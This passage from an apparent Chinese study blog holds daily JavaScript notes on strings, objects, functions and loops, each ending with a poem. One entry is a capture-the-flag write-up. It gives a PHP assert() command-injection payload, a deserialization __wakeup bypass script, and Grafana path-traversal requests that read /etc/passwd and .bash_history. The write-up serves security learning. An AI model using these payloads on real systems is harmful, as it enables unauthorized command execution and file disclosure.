n 的power次幂</p><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>文本数据被以字符串形式存储，单个字符没有单独的类型。<br>字符串的内部格式始终是 UTF-16，它不依赖于页面编码。<br>引号（Quotes）:<br>1.反引号允许我们通过 ${…} 将任何表达式嵌入到字符串中<br>2.允许字符串跨行</p><p>特殊字符:</p><pre><code>\n         换行\r         Windows 文本文件中，两个字符 \r\n 的组合代表一个换行。而在非 Windows 操作系统上，它就是 \n。\&#39;和\&quot;     引号\          转义字符\\         反斜线\t         制表符\b         退格\f         换页\v         垂直\xXX       十六进制 Unicode XX 的 Unicode 字符\u&#123;X…XXXXXX&#125;（1 到 6 个十六进制字符）     具有给定 UTF-32 编码的 Unicode 符号</code></pre><p>字符串长度:</p><pre><code>let str = `Hello`;// 第一个字符alert( str[0] ); // Halert( str.charAt(0) ); // H// 最后一个字符alert( str[str.length - 1] ); // o如果没有找到字符，[] 返回 undefined，而 charAt 返回一个空字符串</code></pre><p>字符串是不可变的:<br>要更改就要创建一个新的字符串，并将其分配给新字符串而不是以前的字符串</p><p>改变大小写:</p><pre><code>toLowerCase() 和 toUpperCase() 改变单个字符大小写alert( &#39;Interface&#39;[0].toLowerCase() ); // &#39;i&#39;</code></pre><p>查找子字符串:<br>str.indexOf(substr, pos)<br>从给定位置 pos 开始，在 str 中查找 substr，如果没有找到，则返回 -1，否则返回匹配成功的位置<br>如果我们对所有存在位置都感兴趣，可以在一个循环中使用 indexOf<br>str.lastIndexOf(substr, position)<br>从字符串的末尾开始搜索到开头,以相反的顺序列出这些事件</p><p>按位（bitwise）NOT :<br>将数字转换为 32-bit 整数（如果存在小数部分，则删除小数部分），然后对其二进制表示形式中的所有位均取反<br>对于 32-bit 整数，~n 等于 -(n+1)</p><p>includes，startsWith，endsWith:<br>includes检测匹配，但不需要它的位置,第二个可选参数是开始搜索的起始位置</p><pre><code>alert( &quot;Widget&quot;.startsWith(&quot;Wid&quot;) );        // true，&quot;Widget&quot; 以 &quot;Wid&quot; 开始alert( &quot;Widget&quot;.endsWith(&quot;get&quot;) );          // true，&quot;Widget&quot; 以 &quot;get&quot; 结束</code></pre><p>获取子字符串:</p><pre><code>str.slice(start,end)返回字符串从 start 到（但不包括）end 的部分start/end 也有可能是负值。它们的意思是起始位置从字符串结尾计算str.substring(start,end)返回字符串从 start 到（但不包括）end 的部分。这与 slice 几乎相同，但它允许 start 大于 endstr.substr(start,length)返回字符串从 start 开始的给定 length 的部分。与以前的方法相比，这个允许我们指定 length 而不是结束位置第一个参数可能是负数，从结尾算起</code></pre><p>比较字符串:<br>1.小写字母总是大于大写字母<br>2.带变音符号的字母存在“乱序”的情况(例如部分国家名字)<br>str.codePointAt(pos)返回在 pos 位置的字符代码<br>String.fromCodePoint(code)通过数字 code 创建字符<br>可以用 \u 后跟十六进制代码，通过这些代码添加 Unicode 字符</p><p><a href="https://zh.javascript.info/string#nei-bu-unicode">内部，Unicode</a></p><p>其他几种有用的字符串方法：<br>str.trim()删除字符串前后的空格 (“trims”)。<br>str.repeat(n)重复字符串 n 次。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="我打江南走过"><a href="#我打江南走过" class="headerlink" title="我打江南走过"></a>我打江南走过</h5><h5 id="那等在季节里的容颜如莲花的开落"><a href="#那等在季节里的容颜如莲花的开落" class="headerlink" title="那等在季节里的容颜如莲花的开落"></a>那等在季节里的容颜如莲花的开落</h5><h5 id="东风不来，三月的柳絮不飞"><a href="#东风不来，三月的柳絮不飞" class="headerlink" title="东风不来，三月的柳絮不飞"></a>东风不来，三月的柳絮不飞</h5><h5 id="你底心如小小寂寞的城"><a href="#你底心如小小寂寞的城" class="headerlink" title="你底心如小小寂寞的城"></a>你底心如小小寂寞的城</h5><h5 id="恰若青石的街道向晚"><a href="#恰若青石的街道向晚" class="headerlink" title="恰若青石的街道向晚"></a>恰若青石的街道向晚</h5><h5 id="跫音不响，三月的春帷不揭"><a href="#跫音不响，三月的春帷不揭" class="headerlink" title="跫音不响，三月的春帷不揭"></a>跫音不响，三月的春帷不揭</h5><h5 id="你底心是小小的窗扉紧掩"><a href="#你底心是小小的窗扉紧掩" class="headerlink" title="你底心是小小的窗扉紧掩"></a>你底心是小小的窗扉紧掩</h5><h5 id="我达达的马蹄是美丽的错误"><a href="#我达达的马蹄是美丽的错误" class="headerlink" title="我达达的马蹄是美丽的错误"></a>我达达的马蹄是美丽的错误</h5><h5 id="我不是归人，是个过客"><a href="#我不是归人，是个过客" class="headerlink" title="我不是归人，是个过客"></a>我不是归人，是个过客</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221106CTF总结</title>
      <link href="/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="404页面"><a href="#404页面" class="headerlink" title="404页面:"></a>404页面:</h5><p>url+404/</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h5><pre><code>&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if($_GET[&#39;c&#39;] === &quot;flag&quot;)&#123;            如果 c=flag 的话，会看到 flag.php 文件        highlight_file(&quot;flag.php&quot;);    &#125;    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;       正则匹配过滤 flag 字符        $page = $_GET[&#39;c&#39;];    &#125;    assert(&quot;file_exists(&#39;$page&#39;)&quot;);           assert 函数&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;利用assert函数的特性，实现命令执行assert函数里面的参数为字符串时，会将字符串当做php命令来执行。assert(&#39;phpinfo()&#39;)=&lt;?php phpinfo()?&gt;构造闭合函数，使 assert 函数执行系统命令为还过滤了 flag 字符，使用?匹配符绕过Payload：?c=1&#39;) or system(&#39;ls?c=1&#39;) or system(&#39;cat fla?.txt</code></pre><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>construct()：构造函数/方法，是类中的一种特殊函数,当使用 new 关键字实例化一个对象时,构造函数将会自动调用<br>wakeup( )函数是在 php 在使用反序列化函数 unserialize()时，会自动调用的函数，只要序列化的中的成员数大于实际成员数，即可绕过<br>destruct()函数是在对象被销毁时才会被调用，可以注意到flag.php文件，需password=666绕过第一个if，username等于usernames才能够输出flag文件；<br>参数需要进行 base64 加密<br>Payload：<br>&lt;?php<br>class Name{<br> private $username = ‘usernames’;<br> private $password = ‘666’;<br>}<br>$select = serialize(new Name());<br>$select = str_replace(‘:2:’,’:3:’,$select);<br>echo base64_encode($select);</p><h5 id="grafana漏洞"><a href="#grafana漏洞" class="headerlink" title="grafana漏洞"></a>grafana漏洞</h5><p>抓包根据漏洞的原理，构造 payload 路径，进行任意文件读取<br>/public/plugins/alertlist/../../../../../../../../../etc/pa<br>sswd<br>看到系统的配置文件，存在哪些用户<br>linux 的历史记录文件.bash_history<br>构造 payload:<br>/public/plugins/alertlist/../../../../../../../../../home/grafana/.bash_history</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20221105</title>
      <link href="/2022/11/05/20221105/"/>
      <url>/2022/11/05/20221105/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="注-本章节较难，请选择性阅读"><a href="#注-本章节较难，请选择性阅读" class="headerlink" title="注:本章节较难，请选择性阅读"></a>注:本章节较难，请选择性阅读</h5><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>使用{…}来创建对象。一个属性就是一个键值对（“key: value”），其中键是一个字符串（也叫做属性名），值可以是任何值。</p><pre><code>构造对象方法:let user = new Object();     // “构造函数” 的语法let user = &#123;&#125;;               // “字面量” 的语法读取文件的属性:alert( user.name );          // Johnalert( user.age );           // 30移除属性:delete user.age;             // 移除age这个key方括号:let user = &#123;&#125;;// 设置user[&quot;likes birds&quot;] = true;  // 单引号或双引号都可以// 读取alert(user[&quot;likes birds&quot;]);  // true// 删除delete user[&quot;likes birds&quot;];属性值简写:name, 与 name: name 相同属性名称限制:类型会被自动地转换为字符串但__proto__属性。不能将它设置为一个非对象的值属性存在性测试:alert( user.noSuchProperty === undefined );       // true 意思是没有这个属性alert( &quot;age&quot; in user );                           // true 存在</code></pre><h4 id="for-in-循环"><a href="#for-in-循环" class="headerlink" title="for..in 循环"></a>for..in 循环</h4><pre><code>for (key in object) &#123;  // 对此对象属性中的每个键执行的代码&#125;遍历一个对象时，整数属性会被进行从小到大排序但是 “+49” 和 “1.2” 不行，那它们就按照创建时的顺序来排序</code></pre><h4 id="对象引用和复制"><a href="#对象引用和复制" class="headerlink" title="对象引用和复制"></a>对象引用和复制</h4><p>赋值了对象的变量存储的不是对象本身，而是该对象“在内存中的地址”。</p><h5 id="对象的引用"><a href="#对象的引用" class="headerlink" title="对象的引用:"></a>对象的引用:</h5><pre><code>let user = &#123; name: &#39;John&#39; &#125;;let admin = user;admin.name = &#39;Pete&#39;;               // 通过 &quot;admin&quot; 引用来修改alert(user.name);                  // &#39;Pete&#39;，修改能通过 &quot;user&quot; 引用看到</code></pre><p>仅当两个对象为同一对象时，两者才相等。<br>两个独立的对象则并不相等，即使它们看起来很像（都为空）。</p><h5 id="对象的复制"><a href="#对象的复制" class="headerlink" title="对象的复制"></a>对象的复制</h5><p>通过遍历已有对象的属性，并在原始类型值的层面复制它们，以实现对已有对象结构的复制。</p><pre><code>let user = &#123;  name: &quot;John&quot;,&#125;;let clone = &#123;&#125;;                       // 新的空对象for (let key in user) &#123;               // 将 user 中所有的属性拷贝到其中  clone[key] = user[key];             // 现在 clone 是带有相同内容的完全独立的对象&#125;clone.name = &quot;Pete&quot;;                  // 改变了其中的数据alert( user.name );                   // 原来的对象中的 name 属性依然是 John【也可以使用 Object.assign 方法】Object.assign(dest, [src1, src2, src3...])1.dest 是指目标对象2.src1, ..., srcN是源对象（需传递的参数）3.将所有源对象的属性拷贝到目标对象 dest 中4.调用结果返回 dest5.如果被拷贝的属性的属性名已经存在，那么它会被覆盖</code></pre><h5 id="深层克隆"><a href="#深层克隆" class="headerlink" title="深层克隆"></a>深层克隆</h5><pre><code>let 克隆生成的对象 = Object.assign(&#123;&#125;, 克隆的对象);或者使用“深拷贝”函数，例如 _.cloneDeep(obj)</code></pre><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p>1.可达性<br>&emsp;&emsp;如果一个值可以通过引用链从根访问任何其他值，则认为该值是可达的<br>&emsp;&emsp;垃圾回收器会删除掉那些已经不可达的(没有外部对其的引用)<br>2.内部算法(mark-and-sweep):<br>&emsp;&emsp;垃圾收集器遍历所有的根，并“标记”（记住）它们和他们的引用。<br>&emsp;&emsp;没有被标记的对象都会被删除。<br>3.优化建议:<br>&emsp;&emsp;分代收集/增量收集/闲时收集<br>&emsp;&emsp;<a href="https://zh.javascript.info/garbage-collection#zong-jie">进阶了解</a></p><h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><p>存储在对象属性中的函数被称为“方法”<br>使用函数表达式创建一个函数，并将其指定给对象的属性，随后调用它。就叫做得到了 user 对象的 sayHi 方法。</p><h5 id="this"><a href="#this" class="headerlink" title="this"></a>this</h5><p>访问对象中存储的信息<br>this可以用于任何函数,它取决于代码上下文<br>严格模式下没有对象的情况下调用:this==undefined但尝试访问this.name将会报错<br>this的值是在调用时计算出来的，它的值取决于在“点符号前”的是什么对象。<br>箭头函数没有自己的this。若在箭头函数中引用this，则this值取决于外部“正常的”函数。</p><pre><code>let user = &#123; name: &quot;John&quot; &#125;;let admin = &#123; name: &quot;Admin&quot; &#125;;function sayHi() &#123;  alert( this.name );&#125;// 在两个对象中使用相同的函数user.f = sayHi;admin.f = sayHi;// 这两个调用有不同的 this 值// 函数内部的 &quot;this&quot; 是“点符号前面”的那个对象user.f(); // John（this == user）admin.f(); // Admin（this == admin）admin[&#39;f&#39;](); // Admin（使用点符号或方括号语法来访问这个方法，都没有关系。）</code></pre><h4 id="重点误区，必须记住"><a href="#重点误区，必须记住" class="headerlink" title="重点误区，必须记住"></a><a href="https://zh.javascript.info/object-methods#zai-dui-xiang-zi-mian-liang-zhong-shi-yong-this">重点误区，必须记住</a></h4><h4 id="构造器和操作符-“new”"><a href="#构造器和操作符-“new”" class="headerlink" title="构造器和操作符 “new”"></a>构造器和操作符 “new”</h4><h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>命名以大写字母开头。<br>只能由 “new” 操作符来执行</p><pre><code>function User(name) &#123;                1.一个新的空对象被创建并分配给 this。  this.name = name;                  2.函数体执行。通常它会修改 this，为其添加新的属性。  this.isAdmin = false;              3.返回 this 的值。&#125;</code></pre><p>任何函数（除了箭头函数，它没有自己的 this）都可以用作构造器</p><h4 id="new-function-…"><a href="#new-function-…" class="headerlink" title="new function() { … }"></a>new function() { … }</h4><p>如果有许多行用于创建单个复杂对象的代码，可以将它们封装在一个立即调用的构造函数中</p><pre><code>// 创建一个函数并立即使用 new 调用它let user = new function() &#123;  this.name = &quot;John&quot;;  this.isAdmin = false;  // ……用于用户创建的其他代码  // 也许是复杂的逻辑和语句  // 局部变量等&#125;;</code></pre><p>这个构造函数不能被再次调用，因为它不保存在任何地方，只是被创建和调用。<br>因此，这个技巧旨在封装构建单个对象的代码，而无需将来重用。</p><h4 id="构造器模式测试-无需重视"><a href="#构造器模式测试-无需重视" class="headerlink" title="构造器模式测试,无需重视"></a><a href="https://zh.javascript.info/constructor-new#gou-zao-qi-mo-shi-ce-shi-newtarget">构造器模式测试,无需重视</a></h4><h4 id="可选链"><a href="#可选链" class="headerlink" title="可选链"></a>可选链</h4><pre><code>语法有三种形式：obj?.prop —— 如果 obj 存在则返回 obj.prop，否则返回 undefined。obj?.[prop] —— 如果 obj 存在则返回 obj[prop]，否则返回 undefined。obj.method?.() —— 如果 obj.method 存在则调用 obj.method()，否则返回 undefined。总结?. 检查左边部分是否为 null/undefined，如果不是则继续运算。</code></pre><h4 id="symbol-类型"><a href="#symbol-类型" class="headerlink" title="symbol 类型"></a>symbol 类型</h4><p>“symbol” 值表示唯一的标识符。<br>使用 Symbol() 来创建这种类型的值<br>可以给 symbol 一个描述（也称为 symbol 名）          //let id = Symbol(“id”);<br>symbol 保证是唯一的。即使我们创建了许多具有相同描述的 symbol，它们的值也是不同。symbol 不会被自动转换为字符串<br>真的想显示一个 symbol，我们需要</p><pre><code>在它上面调用 .toString()    let id = Symbol(&quot;id&quot;);    alert(id.toString());        //Symbol(id)或者获取 symbol.description 属性，只显示描述    let id = Symbol(&quot;id&quot;);    alert(id.description);       // id</code></pre><p>主要的使用场景：<br>1.“隐藏” 对象属性。<br>    如果我们想要向“属于”另一个脚本或者库的对象添加一个属性，我们可以创建一个 symbol 并使用它作为属性的键。<br>2.JavaScript 使用了许多系统 symbol，这些 symbol 可以作为 Symbol.* 访问。我们可以使用它们来改变一些内建行为。<br>3.symbol 在 for…in 中会被跳过<br>4.Object.keys(user) 也会忽略它们<br>5.相反，Object.assign 会同时复制字符串和 symbol 属性</p><h4 id="对象-——-原始值转换"><a href="#对象-——-原始值转换" class="headerlink" title="对象 —— 原始值转换"></a>对象 —— 原始值转换</h4><p>JavaScript 不允许自定义运算符对对象的处理方式<br>此类运算的情况下，对象会被自动转换为原始值，然后对这些原始值进行运算，并得到运算结果（也是一个原始值）</p><h5 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h5><p>1.没有转换为布尔值,所有的对象在布尔上下文（context）中均为 true<br>2.数字转换发生在对象相减或应用数学函数时<br>3.字符串转换通常发生在像 alert(obj) 这样输出一个对象和类似的上下文中</p><h5 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h5><p>“string”（对于 alert 和其他需要字符串的操作）<br>“number”（对于数学运算）<br>“default”（少数运算符，通常对象以和 “number” 相同的方式实现 “default” 转换）</p><h4 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="Symbol.toPrimitive"></a>Symbol.toPrimitive</h4><p>用来给转换方法命名</p><h4 id="toString-valueOf"><a href="#toString-valueOf" class="headerlink" title="toString/valueOf"></a>toString/valueOf</h4><p>对于 “string” hint：调用 toString 方法，如果它不存在，则调用 valueOf 方法（因此，对于字符串转换，优先调用 toString）。<br>对于其他 hint：调用 valueOf 方法，如果它不存在，则调用 toString 方法（因此，对于数学运算，优先调用 valueOf 方法）。</p><h4 id="转换可以返回任何原始类型"><a href="#转换可以返回任何原始类型" class="headerlink" title="转换可以返回任何原始类型"></a>转换可以返回任何原始类型</h4><p>它们不一定会返回 “hint” 的原始值<br>唯一强制性的事情是：这些方法必须返回一个原始值，而不是对象。</p><h4 id="进一步的转换"><a href="#进一步的转换" class="headerlink" title="进一步的转换"></a>进一步的转换</h4><p>如果我们将对象作为参数传递，则会出现两个运算阶段：<br>1.对象被转换为原始值（通过前面我们描述的规则）。<br>2.如果还需要进一步计算，则生成的原始值会被进一步转换。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><pre><code>首先调用 obj[Symbol.toPrimitive](hint) 如果这个方法存在，否则，如果 hint 是 &quot;string&quot;        尝试调用 obj.toString() 或 obj.valueOf()，无论哪个存在。否则，如果 hint 是 &quot;number&quot; 或者 &quot;default&quot;        尝试调用 obj.valueOf() 或 obj.toString()，无论哪个存在。在实际使用中，通常只实现 obj.toString() 作为字符串转换的“全能”方法就足够了，该方法应该返回对象的“人类可读”表示，用于日志记录或调试。</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="遇事不决可问春风，春风不语即随本心。"><a href="#遇事不决可问春风，春风不语即随本心。" class="headerlink" title="遇事不决可问春风，春风不语即随本心。"></a>遇事不决可问春风，春风不语即随本心。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221104</title>
      <link href="/2022/11/04/20221104/"/>
      <url>/2022/11/04/20221104/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><pre><code>let sayHi = function() &#123;  alert( &quot;Hello&quot; );&#125;;function关键字后面没有函数名。函数表达式允许省略函数名注意末尾会有个分号!因为这是以 function(…) &#123;…&#125; 的形式创建的。它不是函数语法的一部分。含义:&quot;创建一个函数并将其放入变量sayHi中&quot;。alert( sayHi );         // 显示函数代码————因为函数是一个值alert( sayHi() );       // 执行函数let func = sayHi;       //将 sayHi 复制到了变量 func</code></pre><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><pre><code>function ask(question, yes, no) &#123;  if (confirm(question)) yes()  else no();&#125;function showOk() &#123;  alert( &quot;You agreed.&quot; );&#125;function showCancel() &#123;  alert( &quot;You canceled the execution.&quot; );&#125;// 用法：函数 showOk 和 showCancel 被作为参数传入到 askask(&quot;Do you agree?&quot;, showOk, showCancel);</code></pre><p>showOk 是回答 “yes” 的回调，showCancel 是回答 “no” 的回调。</p><h5 id="函数表达式-vs-函数声明"><a href="#函数表达式-vs-函数声明" class="headerlink" title="函数表达式 vs 函数声明"></a>函数表达式 vs 函数声明</h5><p>1.语法<br>函数声明：在主代码流中声明为单独的语句的函数<br>函数表达式：在一个表达式中或另一个语法结构中创建的函数。下面这个函数是在赋值表达式 = 右侧创建的<br>2.创建函数时机<br>在函数声明被定义之前，它就可以被调用。<br>函数表达式是在代码执行到达时被创建，并且仅从那一刻起可用。<br>3.块级作用域<br>严格模式下，当一个函数声明在一个代码块内时，它在该代码块内的任何位置都是可见的。但在代码块外不可见。</p><pre><code>let age = 16;              // 拿 16 作为例子if (age &lt; 18) &#123;  welcome();               // \   (运行)  function welcome() &#123;     //  |    alert(&quot;Hello!&quot;);       //  |  函数声明在声明它的代码块内任意位置都可用  &#125;                        //  |  在花括号外部调用函数，我们看不到它们内部的函数声明  welcome();               // /   (运行)&#125; else &#123;  function welcome() &#123;    alert(&quot;Greetings!&quot;);  &#125;&#125;welcome();                 // Error: welcome is not defined【正确写法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome;if (age &lt; 18) &#123;  welcome = function() &#123;    alert(&quot;Hello!&quot;);  &#125;;&#125; else &#123;  welcome = function() &#123;    alert(&quot;Greetings!&quot;);  &#125;;&#125;welcome(); // 现在可以了【改进方法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome = (age &lt; 18) ?  function() &#123; alert(&quot;Hello!&quot;); &#125; :  function() &#123; alert(&quot;Greetings!&quot;); &#125;;welcome(); // 现在可以了</code></pre><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><pre><code>单行箭头函数:let sum = (a, b) =&gt; a + b;/* 这个箭头函数是下面这个函数的更短的版本：let sum = function(a, b) &#123;  return a + b;&#125;;*/alert( sum(1, 2) ); // 3多行箭头函数:let sum = (a, b) =&gt; &#123;  // 花括号表示开始一个多行函数  let result = a + b;  return result;       // 如果我们使用了花括号，那么我们需要一个显式的 “return”&#125;;alert( sum(1, 2) );    // 3从 =&gt; 的左侧获取参数，计算并返回右侧表达式的计算结果用花括号括起来之后，需要包含 return 才能返回值（就像常规函数一样）只有一个参数，还可以省略掉参数外的圆括号没有参数，括号则是空的（但括号必须保留）</code></pre><h4 id="函数总结"><a href="#函数总结" class="headerlink" title="函数总结"></a>函数总结</h4><p>1.函数是值。它们可以在代码的任何地方被分配，复制或声明。<br>2.如果函数在主代码流中被声明为单独的语句，则称为“函数声明”。<br>3.如果该函数是作为表达式的一部分创建的，则称其“函数表达式”。<br>4.在执行代码块之前，内部算法会先处理函数声明(所以函数声明在其被声明的代码块内的任何位置都是可见的)<br>5.函数表达式在执行流程到达时创建。<br>6.首选使用函数声明;仅当函数声明不适合对应的任务时，才应使用函数表达式。</p><h3 id="javascript基础复习"><a href="#javascript基础复习" class="headerlink" title="javascript基础复习"></a>javascript基础复习</h3><p>1.语句用分号分隔<br>2.即使我们在某处添加了「额外的」分号，这也不是错误。分号会被忽略的。<br>3.尽量使用”use strict”<br>4.使用let，const（不变的，不能被改变），var（旧式的，稍后会看到）声明变量<br>5.变量是动态类型的，它们可以存储任何值<br>6.有 8 种数据类型：<br>&nbsp;&nbsp;number — 可以是浮点数，也可以是整数，<br>&nbsp;&nbsp;bigint — 用于任意长度的整数，<br>&nbsp;&nbsp;string — 字符串类型，<br>&nbsp;&nbsp;boolean — 逻辑值：true/false，<br>&nbsp;&nbsp;null — 具有单个值 null 的类型，表示“空”或“不存在”，<br>&nbsp;&nbsp;undefined — 具有单个值 undefined 的类型，表示“未分配（未定义）”，<br>&nbsp;&nbsp;object 和 symbol — 对于复杂的数据结构和唯一标识符，我们目前还没学习这个类型。<br>7.交互:alert、prompt 和 confirm<br>8.二进制加号 + 可以连接字符串。如果任何一个操作数是一个字符串，那么另一个操作数也将被转换为字符串<br>9.三元运算符:cond?resultA:resultB。如果cond为真,则返回resultA,否则返回resultB<br>10.空值合并运算符:a??b的结果是a,除非a为null/undefined,这时结果是b。<br>11.在 for(let…) 循环内部声明的变量只在该循环内可见。但可以省略let并重用已有的变量。<br>12.break/continue允许退出整个循环/当前迭代。使用标签来打破嵌套循环<br>13.switch”结构可以替代多个if检查。它内部使用===进行比较。<br>14.prompt的结果是一个字符串，而不是数字<br>15.函数声明和循环语句后不需要加分号</p><h5 id="其它说明"><a href="#其它说明" class="headerlink" title="其它说明"></a>其它说明</h5><p><a href="https://zh.javascript.info/debugging-chrome">在浏览器中调试</a><br><a href="https://zh.javascript.info/coding-style#tasks">代码风格!!!</a><br><a href="https://zh.javascript.info/comments">注释</a></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>从岐山到长安，高铁只需要一个小时就能抵达，这么一段路，丞相却走了一生。<br>从生至死，人需要经历百年，但有一段岁月，却跟着我走完了一生。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221103</title>
      <link href="/2022/11/03/20221103/"/>
      <url>/2022/11/03/20221103/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><pre><code>let i = 0;while (i &lt; 3) &#123;           #条件的结果会被转化为布尔值  alert( i );  i++;&#125;</code></pre><p>如果循环体只有一条语句(单循环体)，则可以省略大括号</p><h5 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h5><pre><code>let i = 0;do &#123;  alert( i );  i++;&#125; while (i &lt; 3);</code></pre><p>将条件检查移至循环体下面<br>先执行循环体，然后检查条件，当条件为真时，重复执行循环体</p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><pre><code>for (begin; condition; step) &#123;  循环体&#125;begin进入循环时执行一次condition判断条件body条件为真时，重复运行step每次循环体迭代后执行</code></pre><p>内联变量声明:<br>&emsp;&emsp;函数在执行时，会先在自己的函数体里查询变量，如果没有，才会一级一级往上查找。函数show()在执行时，输出第一个变量a是undefined是因为它现在自己的执行环境里查询到变量a已声明，即变量提升（即变量可以提前声明但是赋值是不可以的），此时就输出了undefined。<br>&emsp;&emsp;因此会出现变量污染现象<br>省略语句段:<br>&emsp;&emsp;不需要做任何事的部分，就可以省略 begin 语句段<br>&emsp;&emsp;注意for的两个;必须存在</p><h5 id="break与continue"><a href="#break与continue" class="headerlink" title="break与continue"></a>break与continue</h5><p>一，普通<br>用法与python一样<br>但是，禁止break/continue在‘?’的右边<br>所以，不建议使用?代替if语句<br>二，进阶</p><pre><code>标签(在循环之前带有冒号的标识符)break &lt;labelName&gt; 语句跳出循环至标签labelName:处continue &lt;labelName&gt; 语句执行跳转到标记循环的下一次迭代可以将标签移至单独一行break 指令必须在代码块内continue 只有在循环内部才可行</code></pre><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><pre><code>至少一个 case 代码块和一个可选的 default 代码块switch(x) &#123;  case &#39;value1&#39;:  // if (x === &#39;value1&#39;)    ...    [break]  case &#39;value2&#39;:  // if (x === &#39;value2&#39;)    ...    [break]  default:    ...    [break]&#125;流程:判断条件从成立的开始往下执行直到break，若无break则走到尾(包括default)分组:case 3: // (*) 下面这两个 case 被分在一组，满足一个条件就执行，原理是没有breakcase 5:  alert(&#39;Wrong!&#39;);  alert(&quot;Why don&#39;t you take a math class?&quot;);  break;</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在 JavaScript 中，函数不是“神奇的语言结构”，而是一种特殊的值<br>创建函数的三种方法:函数声明，函数表达式，箭头函数</p><pre><code>function name(parameter1, parameter2, ... parameterN) &#123;  ...body...&#125;name();首先是关键字，然后是函数名，然后是括号之间的参数列表(用逗号分隔)，最后是花括号之间的代码(函数体)parameter是函数参数，下面引用函数时可以使用它作为参数(argument)未提供parameter时，那么相应的值就会变成undefined(默认参数)可以text = &quot;内容&quot;这样子来传参返回值return执行时，函数停止，并将值返回给调用代码，没有返回值会导致函数立即退出并为undefined</code></pre><p>局部变量:<br>在函数中声明的变量只在该函数内部可见</p><p>外部变量:<br>函数也可以访问外部变量<br>函数对外部变量拥有全部的访问权限。函数也可以修改外部变量。<br>函数内部声明了同名变量，那么函数会遮蔽外部变量</p><pre><code>默认参数的计算:在JS中，函数在没带个别参数的情况下被调用，默认参数会被计算出来。如果传递了参数text，那么anotherFunction()就不会被调用。如果没传递参数text，那么anotherFunction()就会被调用。function showMessage(from, text = anotherFunction()) &#123;  // anotherFunction() 仅在没有给定 text 时执行  // 其运行结果将成为 text 的值&#125;也可以这样function showCount(count) &#123;  // 如果 count 为 undefined 或 null，则提示 &quot;unknown&quot;  alert(count ?? &quot;unknown&quot;);&#125;showCount(0); // 0showCount(null); // unknownshowCount();                        // unknown或者这样function showMessage(text) &#123;  // ...  if (text === undefined) &#123;         // 如果参数未被传递进来    text = &#39;empty message&#39;;  &#125;  alert(text);&#125;showMessage();                      // empty message还可以这样function showMessage(text) &#123;  // 如果 text 为 undefined 或者为假值，那么将其赋值为 &#39;empty&#39;  text = text || &#39;empty&#39;;  alert(text);&#125;showMessage();                     // empty</code></pre><p>返回值</p><pre><code>function doNothing() &#123; /* 没有代码 */ &#125;alert( doNothing());函数无返回值，它就会像返回 undefined 一样空值的 return 和 return undefined 等效如果想要将返回的表达式写成跨多行的形式，那么应该在return的同一行开始写此表达式(比如先写个括号)</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>作为参数传递给函数的值，会被复制到函数的局部变量。<br>函数可以访问外部变量。但它只能从内到外起作用。函数外部的代码看不到函数内的局部变量。<br>函数可以返回值。如果没有返回值，则其返回的结果是 